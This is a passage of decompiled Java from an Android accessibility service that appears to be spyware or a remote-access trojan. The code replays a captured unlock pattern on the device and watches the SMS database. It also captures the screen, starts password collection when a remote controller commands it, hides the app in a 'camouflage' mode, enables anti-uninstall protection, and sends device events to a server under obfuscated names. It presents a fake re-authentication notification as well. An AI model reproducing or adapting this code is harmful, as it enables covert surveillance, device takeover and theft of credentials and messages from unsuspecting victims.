        dqtvuisjd$performPatternGesture$1 dqtvuisjd_performpatterngesture_1;
        dqtvuisjd dqtvuisjdVar;
        if (continuationImpl instanceof dqtvuisjd$performPatternGesture$1) {
            dqtvuisjd_performpatterngesture_1 = (dqtvuisjd$performPatternGesture$1) continuationImpl;
            int i = dqtvuisjd_performpatterngesture_1.f52628a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                dqtvuisjd_performpatterngesture_1.f52628a3 = i - Integer.MIN_VALUE;
            } else {
                dqtvuisjd_performpatterngesture_1 = new dqtvuisjd$performPatternGesture$1(this, continuationImpl);
            }
        }
        Object obj = dqtvuisjd_performpatterngesture_1.f52626a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = dqtvuisjd_performpatterngesture_1.f52628a3;
        try {
            if (i2 == 0) {
                kg1.m213544f4(obj);
                t60.m214714d6("dqtvuisjd", "🔓 执行图案手势: pattern=" + str + ", layout=" + str2 + ", points=" + arrayList.size());
                if (arrayList.isEmpty()) {
                    t60.m214726f4("dqtvuisjd", "🔓 [performPatternGesture] 坐标为空，无法执行手势");
                    return Boolean.FALSE;
                }
                int size = arrayList.size();
                boolean z = false;
                int i3 = 0;
                int i4 = 0;
                while (i4 < size) {
                    Object obj2 = arrayList.get(i4);
                    i4++;
                    int i5 = i3 + 1;
                    if (i3 < 0) {
                        AbstractC0716jf.m213309g8();
                        throw null;
                    }
                    PointF pointF = (PointF) obj2;
                    t60.m214702c3("dqtvuisjd", "🔓 [performPatternGesture] 坐标[" + i3 + "]: (" + pointF.x + ", " + pointF.y + ")");
                    i3 = i5;
                }
                String str3 = Build.MANUFACTURER;
                t60.m214694b5(str3, "MANUFACTURER");
                String lowerCase = str3.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                boolean z2 = AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "iqoo", false) || AbstractC0779a1.m213652a5(lowerCase, "bbk", false);
                t60.m214714d6("dqtvuisjd", "🔓 [performPatternGesture] 设备厂商: " + lowerCase + ", isVivo=" + z2);
                fd0 fd0Var = this.f52423f4;
                if (fd0Var != null && fd0Var.m212793a1()) {
                    z = true;
                }
                t60.m214714d6("dqtvuisjd", "🔓 [performPatternGesture] 遮罩状态: " + z);
                if (z2) {
                    t60.m214714d6("dqtvuisjd", "🔓 [performPatternGesture] VIVO设备：使用无障碍手势方法");
                    if (this.f52440h1 == null) {
                        t60.m214704c5("dqtvuisjd", "❌ [performPatternGesture] gestureExecutor 未初始化!");
                        return Boolean.FALSE;
                    }
                    final long jMax = Math.max((arrayList.size() - 1) * 200, 1200L);
                    t60.m214714d6("dqtvuisjd", "🔓 [performPatternGesture] VIVO手势时长: " + jMax + "ms");
                    w00 w00Var = new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$performPatternGesture$executeGesture$1
                        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                        {
                            super(0);
                        }

                        @Override // p000.w00
                        public final Object invoke() {
                            t60.m214702c3("dqtvuisjd", "🔓 [performPatternGesture] VIVO开始执行手势...");
                            List list = arrayList;
                            PointF pointF2 = (PointF) list.get(0);
                            t60.m214702c3("dqtvuisjd", AbstractC0003a2.m29b0("🔓 [performPatternGesture] 起点: (", pointF2.x, ", ", pointF2.y, ")"));
                            Path path = new Path();
                            path.moveTo(pointF2.x, pointF2.y);
                            int size2 = list.size();
                            for (int i6 = 1; i6 < size2; i6++) {
                                path.lineTo(((PointF) list.get(i6)).x, ((PointF) list.get(i6)).y);
                                t60.m214702c3("dqtvuisjd", "🔓 [performPatternGesture] 路径点[" + i6 + "]: (" + ((PointF) list.get(i6)).x + ", " + ((PointF) list.get(i6)).y + ")");
                            }
                            GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 1L, jMax)).build();
                            t60.m214702c3("dqtvuisjd", "🔓 [performPatternGesture] 手势构建完成，准备dispatchGesture...");
                            boolean zDispatchGesture = this.dispatchGesture(gestureDescriptionBuild, new C0429du(8), null);
                            t60.m214702c3("dqtvuisjd", "🔓 [performPatternGesture] dispatchGesture返回值: " + zDispatchGesture);
                            if (!zDispatchGesture) {
                                t60.m214704c5("dqtvuisjd", "❌❌❌ [performPatternGesture] dispatchGesture返回false! 可能原因:");
                                t60.m214704c5("dqtvuisjd", "   - 无障碍服务未正确连接");
                                t60.m214704c5("dqtvuisjd", "   - 另一个手势正在执行中");
                                t60.m214704c5("dqtvuisjd", "   - 手势参数无效");
                                t60.m214704c5("dqtvuisjd", "   - SDK版本: " + Build.VERSION.SDK_INT + ", 厂商: " + Build.MANUFACTURER);
                            }
                            return C1351vv.f60710b1;
                        }
                    };
                    if (z) {
                        fd0 fd0Var2 = this.f52423f4;
                        if (fd0Var2 == null) {
                            t60.m214724f2("maskOverlayManager");
                            throw null;
                        }
                        fd0Var2.m212794a2(w00Var);
                    } else {
                        w00Var.invoke();
                    }
                } else {
                    t60.m214714d6("dqtvuisjd", "🔓 [performPatternGesture] 调用 gestureExecutor.performPatternDrag...");
                    a30 a30Var = this.f52440h1;
                    if (a30Var != null) {
                        a30Var.m52a2(arrayList);
                    } else {
                        t60.m214704c5("dqtvuisjd", "❌ [performPatternGesture] gestureExecutor 未初始化!");
                    }
                }
                t60.m214714d6("dqtvuisjd", "🔓 [performPatternGesture] 等待手势完成 (2秒)...");
                dqtvuisjd_performpatterngesture_1.f52625a0 = this;
                dqtvuisjd_performpatterngesture_1.f52628a3 = 1;
                if (b81.m210571b1(2000L, dqtvuisjd_performpatterngesture_1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                dqtvuisjdVar = this;
            } else {
                if (i2 != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                dqtvuisjdVar = dqtvuisjd_performpatterngesture_1.f52625a0;
                kg1.m213544f4(obj);
            }
            t60.m214714d6("dqtvuisjd", "🔓 [performPatternGesture] 检查解锁状态...");
            boolean zM211489i3 = dqtvuisjdVar.m211489i3();
            t60.m214714d6("dqtvuisjd", "🔓 [performPatternGesture] 解锁状态: " + zM211489i3);
            if (zM211489i3) {
                t60.m214714d6("dqtvuisjd", "✅ [performPatternGesture] 图形密码手势执行成功!");
            } else {
                t60.m214726f4("dqtvuisjd", "⚠️ [performPatternGesture] 图形密码手势可能失败");
            }
            return Boolean.valueOf(zM211489i3);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ [performPatternGesture] 执行失败", e);
            return Boolean.FALSE;
        }
    }

    /* renamed from: j5 */
    public final void m211501j5(final int i, final int i2, final String str) {
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (str.equals("numeric")) {
            try {
                System.currentTimeMillis();
                b60 b60Var = this.f52420f1;
                if (b60Var != null) {
                    long jCurrentTimeMillis2 = System.currentTimeMillis();
                    long j = b60Var.f45725a3;
                    if (j > 0 && jCurrentTimeMillis2 - j <= 3000) {
                        t60.m214702c3("dqtvuisjd", "🔢 InputManager检测到最近有数字密码输入活动");
                        t60.m214702c3("dqtvuisjd", "🔢 检测到正在输入数字密码，延迟确认按钮检测");
                        xz0 xz0Var = this.f52413e4;
                        if (xz0Var == null) {
                            t60.m214724f2("serviceLifecycleManager");
                            throw null;
                        }
                        Handler handler = xz0Var.f61208a2;
                        if (handler != null) {
                            handler.postDelayed(new Runnable() { // from class: oj1
                                @Override // java.lang.Runnable
                                public final void run() {
                                    dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                                    dqtvuisjd dqtvuisjdVar = this.f58837a0;
                                    t60.m214695b6(dqtvuisjdVar, "this$0");
                                    String str2 = str;
                                    t60.m214695b6(str2, "$passwordType");
                                    dqtvuisjdVar.m211501j5(i, i2, str2);
                                }
                            }, 1000L);
                            return;
                        }
                        return;
                    }
                }
            } catch (Exception e) {
                tz0.m214810b0("检查数字密码输入状态时出错: ", e.getMessage(), "dqtvuisjd");
            }
        }
        long j2 = jCurrentTimeMillis - this.f52467j8;
        long j3 = this.f52468j9;
        if (j2 >= j3) {
            t60.m214714d6("dqtvuisjd", "🤖 开始智能确认按钮检测: 密码类型=".concat(str));
            this.f52467j8 = jCurrentTimeMillis;
            AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$performSmartConfirmDetection$2(null, this, str), 2);
        } else {
            t60.m214726f4("dqtvuisjd", "⏰ 智能确认检测在冷却期内，跳过执行。剩余冷却时间: " + (j3 - j2) + "ms");
        }
    }

    /* renamed from: j6 */
    public final void m211502j6(final float f, final float f2, final float f3, final float f4, final long j) {
        fd0 fd0Var = this.f52423f4;
        if (fd0Var == null || !fd0Var.m212793a1()) {
            a30 a30Var = this.f52440h1;
            if (a30Var != null) {
                a30Var.m53a3(f, f2, f3, f4, j);
                return;
            }
            return;
        }
        fd0 fd0Var2 = this.f52423f4;
        if (fd0Var2 != null) {
            fd0Var2.m212794a2(new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$performSwipe$2
                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
                    a30 a30Var2 = this.f52639a0.f52440h1;
                    if (a30Var2 != null) {
                        a30Var2.m53a3(f, f2, f3, f4, j);
                    }
                    return C1351vv.f60710b1;
                }
            });
        } else {
            t60.m214724f2("maskOverlayManager");
            throw null;
        }
    }

    /* renamed from: j7 */
    public final void m211503j7(final ArrayList arrayList, final long j) {
        fd0 fd0Var = this.f52423f4;
        if (fd0Var == null || !fd0Var.m212793a1()) {
            a30 a30Var = this.f52440h1;
            if (a30Var != null) {
                a30Var.m54a4(arrayList, j);
                return;
            }
            return;
        }
        fd0 fd0Var2 = this.f52423f4;
        if (fd0Var2 != null) {
            fd0Var2.m212794a2(new w00() { // from class: com.storm.safe.rock.service.dqtvuisjd$performSwipePath$2
                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
                    a30 a30Var2 = this.f52645a0.f52440h1;
                    if (a30Var2 != null) {
                        a30Var2.m54a4(arrayList, j);
                    }
                    return C1351vv.f60710b1;
                }
            });
        } else {
            t60.m214724f2("maskOverlayManager");
            throw null;
        }
    }

    /* renamed from: j8 */
    public final void m211504j8() {
        C0873ms c0873ms = this.f52378a9;
        C1180rh c1180rh = AbstractC1262tj.f60233a0;
        AbstractC0780a0.m213692a3(c0873ms, sc0.f59953a0, new dqtvuisjd$postAuthorizationInit$1(this, null), 2);
        AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$postAuthorizationInit$2(this, null), 2);
    }

    /* JADX WARN: Type inference failed for: r1v2, types: [com.storm.safe.rock.service.dqtvuisjd$registerNetworkEventReceivers$1] */
    /* renamed from: k1 */
    public final void m211505k1() {
        if (this.f52466j7 != null) {
            return;
        }
        try {
            this.f52466j7 = new BroadcastReceiver() { // from class: com.storm.safe.rock.service.dqtvuisjd$registerNetworkEventReceivers$1
                @Override // android.content.BroadcastReceiver
                public void onReceive(Context context, Intent intent) {
                    t60.m214695b6(context, "context");
                    t60.m214695b6(intent, "intent");
                    try {
                        String action = intent.getAction();
                        if (action != null) {
                            int iHashCode = action.hashCode();
                            dqtvuisjd dqtvuisjdVar = this.f52668a0;
                            switch (iHashCode) {
                                case -1886648615:
                                    if (!action.equals("android.intent.action.ACTION_POWER_DISCONNECTED")) {
                                        return;
                                    }
                                    break;
                                case -1513032534:
                                    if (action.equals("android.intent.action.TIME_TICK")) {
                                        dqtvuisjd.m211407a6(dqtvuisjdVar);
                                        try {
                                            zk1 zk1Var = al1.f43714a5;
                                            Context applicationContext = dqtvuisjdVar.getApplicationContext();
                                            t60.m214694b5(applicationContext, "applicationContext");
                                            zk1Var.getInstance(applicationContext).m209821a1();
                                            return;
                                        } catch (Exception unused) {
                                            return;
                                        }
                                    }
                                    return;
                                case -1172645946:
                                    if (action.equals("android.net.conn.CONNECTIVITY_CHANGE")) {
                                        dqtvuisjd.m211407a6(dqtvuisjdVar);
                                        lj0 lj0Var = C0323a8.f53097e0;
                                        Context applicationContext2 = dqtvuisjdVar.getApplicationContext();
                                        t60.m214694b5(applicationContext2, "applicationContext");
                                        C0323a8 orCreate = lj0Var.getOrCreate(applicationContext2);
                                        if (orCreate.m211649b5()) {
                                            return;
                                        }
                                        orCreate.m211643a8();
                                        return;
                                    }
                                    return;
                                case -1076576821:
                                    if (action.equals("android.intent.action.AIRPLANE_MODE")) {
                                        dqtvuisjd.m211407a6(dqtvuisjdVar);
                                        return;
                                    }
                                    return;
                                case 1019184907:
                                    if (!action.equals("android.intent.action.ACTION_POWER_CONNECTED")) {
                                        return;
                                    }
                                    break;
                                default:
                                    return;
                            }
                            dqtvuisjd.m211407a6(dqtvuisjdVar);
                        }
                    } catch (Exception e) {
                        tz0.m214808a8("动态广播处理失败: ", intent.getAction(), "dqtvuisjd", e);
                    }
                }
            };
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("android.intent.action.TIME_TICK");
            intentFilter.addAction("android.intent.action.ACTION_POWER_CONNECTED");
            intentFilter.addAction("android.intent.action.ACTION_POWER_DISCONNECTED");
            intentFilter.addAction("android.intent.action.AIRPLANE_MODE");
            intentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(this.f52466j7, intentFilter, 2);
            } else {
                registerReceiver(this.f52466j7, intentFilter);
            }
            t60.m214714d6("dqtvuisjd", "✅ 网络事件动态广播已注册");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "注册网络事件广播失败", e);
        }
    }

    /* renamed from: k2 */
    public final void m211506k2() {
        t60.m214704c5("dqtvuisjd", "📩📩📩 [ContentObserver] 开始注册短信数据库监听器...");
        try {
            if (this.f52462j3 != null) {
                t60.m214704c5("dqtvuisjd", "📩 [ContentObserver] 监听器已存在，跳过注册");
                return;
            }
            if (checkSelfPermission("android.permission.READ_SMS") != 0) {
                t60.m214704c5("dqtvuisjd", "📩 [ContentObserver] ⚠️ 没有READ_SMS权限，跳过注册");
                return;
            }
            HandlerThread handlerThread = this.f52463j4;
            if (handlerThread != null) {
                handlerThread.quitSafely();
            }
            HandlerThread handlerThread2 = new HandlerThread("SmsObserver");
            handlerThread2.start();
            this.f52463j4 = handlerThread2;
            Handler handler = new Handler(handlerThread2.getLooper());
            handler.post(new bm0(this, 4));
            C0931ny c0931ny = new C0931ny(handler, this);
            this.f52462j3 = c0931ny;
            getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, c0931ny);
            t60.m214704c5("dqtvuisjd", "📩📩📩 [ContentObserver] ✅✅✅ 短信数据库监听器注册成功!");
        } catch (Exception e) {
            tz0.m214808a8("📩 [ContentObserver] ❌ 注册失败: ", e.getMessage(), "dqtvuisjd", e);
        }
    }

    /* renamed from: k3 */
    public final void m211507k3() {
        try {
            Object systemService = getSystemService("window");
            WindowManager windowManager = systemService instanceof WindowManager ? (WindowManager) systemService : null;
            TextView textView = this.f52480l1;
            if (windowManager != null && textView != null) {
                windowManager.removeView(textView);
                t60.m214714d6("dqtvuisjd", "✅ 图标覆盖层已移除");
            }
            this.f52480l1 = null;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 移除图标覆盖层失败", e);
            this.f52480l1 = null;
        }
    }

    /* renamed from: k4 */
    public final void m211508k4() {
        try {
            t60.m214714d6("dqtvuisjd", "📷 开始申请摄像头权限");
            if (checkSelfPermission("android.permission.CAMERA") == 0) {
                t60.m214714d6("dqtvuisjd", "✅ 摄像头权限已授予");
                return;
            }
            C0260a2 c0260a2 = this.f52369a0;
            if (c0260a2 != null) {
                c0260a2.m211326g9();
                return;
            }
            t60.m214726f4("dqtvuisjd", "⚠️ PermissionGranter未初始化，检查是否使用备用方法");
            Intent intent = new Intent(this, (Class<?>) iuzxujjtqev.class);
            intent.setFlags(335544320);
            intent.putExtra("request_camera_permission", true);
            startActivity(intent);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 申请摄像头权限失败", e);
        }
    }

    /* renamed from: k5 */
    public final void m211509k5() {
        boolean z;
        try {
            if (!m211482h6()) {
                t60.m214702c3("dqtvuisjd", "🔍 [保护] APP未处于伪装模式，无需恢复伪装监听");
                this.f52475k6 = false;
                return;
            }
            t60.m214714d6("dqtvuisjd", "✅ [保护] 检测到APP处于伪装模式，恢复伪装监听");
            this.f52475k6 = true;
            C0614i9 c0614i9 = this.f52414e5;
            if (c0614i9 == null) {
                t60.m214726f4("dqtvuisjd", "⚠️ [服务] AccessibilityEventManager未初始化，无法恢复伪装状态");
                return;
            }
            try {
                z = c0614i9.f56821a1.getSharedPreferences("camouflage_state", 0).getBoolean("phone_manager_camouflage_enabled", false);
            } catch (Exception e) {
                try {
                    t60.m214705c6("AccessibilityEventManager", "❌ 恢复伪装状态失败", e);
                    z = false;
                } catch (Exception e2) {
                    t60.m214705c6("AccessibilityEventManager", "❌ 自动恢复伪装状态失败", e2);
                }
            }
            if (z && !c0614i9.f56839b9) {
                c0614i9.f56839b9 = true;
            } else if (!z && c0614i9.f56839b9) {
                c0614i9.f56839b9 = false;
            }
            t60.m214714d6("dqtvuisjd", "✅ [保护] 伪装监听状态已恢复，isAppHidden=true");
        } catch (Exception e3) {
            t60.m214705c6("dqtvuisjd", "❌ [保护] 恢复伪装状态失败", e3);
        }
    }

    /* renamed from: k6 */
    public final void m211510k6() {
        try {
            if (this.f52478k9 >= 0 && Settings.System.canWrite(this)) {
                Settings.System.putInt(getContentResolver(), "screen_brightness", this.f52478k9);
                t60.m214714d6("dqtvuisjd", "🔆 屏幕亮度已恢复（值: " + this.f52478k9 + "）");
                this.f52478k9 = -1;
            }
        } catch (Exception e) {
            tz0.m214810b0("恢复亮度失败: ", e.getMessage(), "dqtvuisjd");
        }
    }

    /* renamed from: k7 */
    public final void m211511k7() {
        try {
            t60.m214704c5("dqtvuisjd", "🔐🔐🔐 [密码调试] resumeWriteSettingsPermissionRequest() 被调用！");
            t60.m214704c5("dqtvuisjd", "🔐🔐🔐 [密码调试] 调用堆栈:");
            StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();
            t60.m214694b5(stackTrace, "currentThread().stackTrace");
            int i = 0;
            for (Object obj : AbstractC0134bh.m210732f5(stackTrace, 15)) {
                int i2 = i + 1;
                if (i < 0) {
                    AbstractC0716jf.m213309g8();
                    throw null;
                }
                StackTraceElement stackTraceElement = (StackTraceElement) obj;
                t60.m214704c5("dqtvuisjd", "🔐     [" + i + "] " + stackTraceElement.getClassName() + "." + stackTraceElement.getMethodName() + "(" + stackTraceElement.getFileName() + ":" + stackTraceElement.getLineNumber() + ")");
                i = i2;
            }
            t60.m214714d6("dqtvuisjd", "▶️ 恢复WRITE_SETTINGS权限申请");
            this.f52432g3 = false;
            C0327b2 c0327b2 = this.f52429g0;
            if (c0327b2 != null) {
                boolean zM211734d5 = c0327b2.m211734d5();
                t60.m214704c5("dqtvuisjd", "🔐🔐🔐 [密码调试] hasPermission=" + zM211734d5);
                if (zM211734d5) {
                    t60.m214714d6("dqtvuisjd", "🔐 WRITE_SETTINGS权限已获取，跳过恢复权限申请（避免重复触发密码界面）");
                    if (this.f52477k8) {
                        return;
                    }
                    t60.m214714d6("dqtvuisjd", "🛡️ WRITE_SETTINGS权限已有但防卸载未启用，立即启用");
                    m211460e9();
                    return;
                }
            }
            t60.m214704c5("dqtvuisjd", "🔐🔐🔐 [密码调试] WRITE_SETTINGS权限未获取，等待系统稳定后申请");
            t60.m214714d6("dqtvuisjd", "🔧 WRITE_SETTINGS权限未获取，等待系统稳定");
            AbstractC0780a0.m213692a3(this.f52378a9, null, new dqtvuisjd$resumeWriteSettingsPermissionRequest$3(this, null), 3);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 恢复WRITE_SETTINGS权限申请失败", e);
        }
    }

    /* renamed from: k8 */
    public final void m211512k8() {
        try {
            SharedPreferences sharedPreferences = getSharedPreferences(StringUtil.m212470a0("LFwCLlgqCRFTNC9MAQ=="), 0);
            JSONArray jSONArray = new JSONArray();
            Iterator it = this.f52403d4.iterator();
            while (it.hasNext()) {
                jSONArray.put((String) it.next());
            }
            sharedPreferences.edit().putString(this.f52404d5, jSONArray.toString()).apply();
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 保存图案去重列表失败", e);
        }
    }

    /* renamed from: l0 */
    public final void m211513l0(String str, boolean z) {
        try {
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 == null || !c0323a8.f53103a3) {
                t60.m214726f4("dqtvuisjd", "⚠️ NetworkManager未初始化或未连接，无法发送隐藏状态");
                return;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
            jSONObject.put("isHidden", z);
            jSONObject.put("message", str);
            jSONObject.put("timestamp", System.currentTimeMillis());
            jSONObject.put("deviceId", m211470g4());
            C0323a8 c0323a82 = this.f52415e6;
            if (c0323a82 == null) {
                t60.m214724f2("networkManager");
                throw null;
            }
            c0323a82.m211658c4(StringUtil.m212470a0("KkkBBUUxCCtoIj9YBS9e"), jSONObject);
            t60.m214702c3("dqtvuisjd", "📤 应用隐藏结果已发送: isHidden=" + z + ", message=" + str);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "发送应用隐藏结果失败", e);
        }
    }

    /* renamed from: l1 */
    public final void m211514l1(String str, boolean z) {
        try {
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 != null) {
                String strM212470a0 = StringUtil.m212470a0("KVAeN0gsHidUDjlcAi9BLA==");
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, z);
                jSONObject.put("message", str);
                jSONObject.put("timestamp", System.currentTimeMillis());
                c0323a8.m211658c4(strM212470a0, jSONObject);
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "发送生物识别结果失败", e);
        }
    }

    /* renamed from: l2 */
    public final void m211515l2(String str, Map map) {
        C0267a0 c0267a0M211645b1;
        try {
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 == null || (c0267a0M211645b1 = c0323a8.m211645b1()) == null || !c0267a0M211645b1.f52263a3) {
                return;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("type", str);
            jSONObject.put("data", new JSONObject((Map<?, ?>) map));
            jSONObject.put("timestamp", System.currentTimeMillis());
            String string = jSONObject.toString();
            t60.m214694b5(string, "response.toString()");
            c0267a0M211645b1.m211367a8(string);
            t60.m214702c3("dqtvuisjd", "📤 发送命令响应: ".concat(str));
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "发送命令响应失败", e);
        }
    }

    /* renamed from: l3 */
    public final void m211516l3(String str) {
        C0267a0 c0267a0M211645b1;
        t60.m214695b6(str, "message");
        try {
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 == null || (c0267a0M211645b1 = c0323a8.m211645b1()) == null || !c0267a0M211645b1.f52263a3) {
                return;
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("type", "debug_log");
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("message", str);
            jSONObject2.put("timestamp", System.currentTimeMillis());
            jSONObject.put("data", jSONObject2);
            String string = jSONObject.toString();
            t60.m214694b5(string, "log.toString()");
            c0267a0M211645b1.m211367a8(string);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "发送调试日志失败", e);
        }
    }

    /* renamed from: l4 */
    public final void m211517l4(JSONObject jSONObject) {
        try {
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 == null || !c0323a8.f53103a3) {
                t60.m214726f4("dqtvuisjd", "⚠️ NetworkManager未初始化或未连接，无法发送设备事件");
                return;
            }
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("eventType", "logging_status");
            jSONObject2.put("eventData", jSONObject);
            jSONObject2.put("timestamp", System.currentTimeMillis());
            String strConcat = "日志记录状态: ".concat(jSONObject.optBoolean("enabled") ? "已启用" : "已禁用");
            JSONObject jSONObject3 = new JSONObject();
            jSONObject3.put("deviceId", m211470g4());
            jSONObject3.put("logType", "SYSTEM_EVENT");
            jSONObject3.put("content", strConcat);
            jSONObject3.put("extraData", jSONObject2);
            jSONObject3.put("timestamp", System.currentTimeMillis());
            C0323a8 c0323a82 = this.f52415e6;
            if (c0323a82 == null) {
                t60.m214724f2("networkManager");
                throw null;
            }
            c0323a82.m211661c7(jSONObject3);
            t60.m214702c3("dqtvuisjd", "📤 设备事件已通过操作日志通道发送: logging_status");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 发送设备事件失败", e);
        }
    }

    /* renamed from: l5 */
    public final void m211518l5() {
        try {
            Object systemService = getSystemService("keyguard");
            KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
            Object systemService2 = getSystemService("power");
            PowerManager powerManager = systemService2 instanceof PowerManager ? (PowerManager) systemService2 : null;
            boolean zIsKeyguardLocked = keyguardManager != null ? keyguardManager.isKeyguardLocked() : false;
            boolean z = true;
            boolean zIsInteractive = powerManager != null ? powerManager.isInteractive() : true;
            if (zIsKeyguardLocked || zIsInteractive) {
                z = zIsInteractive;
            }
            t60.m214702c3("dqtvuisjd", "📱 屏幕状态: isLocked=" + zIsKeyguardLocked + ", isScreenOn=" + z);
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 != null) {
                c0323a8.m211666d2(zIsKeyguardLocked, z);
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 发送屏幕状态更新失败", e);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:4:0x001c A[PHI: r3
      0x001c: PHI (r3v5 double) = (r3v0 double), (r3v1 double) binds: [B:3:0x001a, B:6:0x0022] A[DONT_GENERATE, DONT_INLINE]] */
    /* renamed from: l6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211519l6(int i, int i2, double d) {
        this.f52396c7 = AbstractC1117qo.m214413a9(i, 10, 100);
        int iM214413a9 = AbstractC1117qo.m214413a9(i2, 5, 30);
        this.f52397c8 = iM214413a9;
        double d2 = 0.3d;
        if (d < 0.3d) {
            d = d2;
        } else {
            d2 = 1.0d;
            if (d > 1.0d) {
            }
        }
        this.f52398c9 = d;
        StringBuilder sbM38b9 = AbstractC0003a2.m38b9("📺 设置投屏质量: quality=", this.f52396c7, ", fps=", iM214413a9, ", scale=");
        sbM38b9.append(d);
        t60.m214714d6("dqtvuisjd", sbM38b9.toString());
        try {
            C0263a5.f52144b0.setParams(this.f52396c7, this.f52397c8, this.f52398c9);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "设置etzbzyzqxvqm质量失败", e);
        }
        try {
            MediaDisplayService.C0279a0 c0279a0 = MediaDisplayService.f52303c1;
            if (c0279a0.getInstance() != null) {
                int i3 = this.f52396c7;
                int i4 = this.f52397c8;
                double d3 = this.f52398c9;
                MediaDisplayService.f52307c5 = AbstractC1117qo.m214413a9(i3, 10, 100);
                MediaDisplayService.f52304c2 = AbstractC1117qo.m214413a9(i4, 5, 30);
                MediaDisplayService.f52308c6 = AbstractC1117qo.m214412a8((float) d3, 0.3f, 1.0f);
            }
            c0279a0.setQuality(this.f52396c7);
            c0279a0.setTargetFps(this.f52397c8);
            c0279a0.setScale((float) this.f52398c9);
        } catch (Exception e2) {
            t60.m214705c6("dqtvuisjd", "设置ScreenProjection质量失败", e2);
        }
    }

    /* renamed from: l7 */
    public final void m211520l7(MediaProjection mediaProjection) {
        try {
            if (this.f52370a1 == null) {
                t60.m214726f4("dqtvuisjd", "etzbzyzqxvqm未初始化");
                return;
            }
            t60.m214726f4("etzbzyzqxvqm", "setMediaProjection 已弃用，请使用 MediaDisplayService");
            if (!m211484h8()) {
                t60.m214714d6("dqtvuisjd", "MediaProjection已设置，等待设备注册成功后启动屏幕捕获");
                return;
            }
            t60.m214714d6("dqtvuisjd", "设备已注册，立即启动屏幕捕获");
            C0263a5 c0263a5 = this.f52370a1;
            if (c0263a5 != null) {
                c0263a5.m211351a7();
            } else {
                t60.m214724f2("etzbzyzqxvqm");
                throw null;
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "设置etzbzyzqxvqm MediaProjection失败", e);
        }
    }

    /* renamed from: l8 */
    public final void m211521l8(String str) {
        t60.m214695b6(str, "overlayType");
        try {
            t60.m214714d6("dqtvuisjd", "🔐 控制端触发密码采集，类型: " + str + " -> 使用系统真实验证");
            m211442c7(false);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 启动密码采集失败", e);
        }
    }

    /* renamed from: l9 */
    public final void m211522l9() {
        try {
            ak0 ak0Var = new ak0(this, "system_helper_service");
            ak0Var.f43675a4 = ak0.m209804a1(getString(R$string.notification_reauth_title));
            ak0Var.f43676a5 = ak0.m209804a1(getString(R$string.notification_reauth_text));
            ak0Var.f43688b7.icon = R$drawable.rbg20;
            ak0Var.f43680a9 = 1;
            ak0Var.m209806a2(16);
            C1217sc c1217sc = new C1217sc(8, false);
            c1217sc.f59952a2 = ak0.m209804a1(getString(R$string.notification_reauth_big_text));
            if (ak0Var.f43682b1 != c1217sc) {
                ak0Var.f43682b1 = c1217sc;
                c1217sc.m214598b1(ak0Var);
            }
            Intent intent = new Intent(this, (Class<?>) iuzxujjtqev.class);
            intent.setFlags(335544320);
            ak0Var.f43677a6 = PendingIntent.getActivity(this, 0, intent, 201326592);
            int i = R$drawable.rbg20;
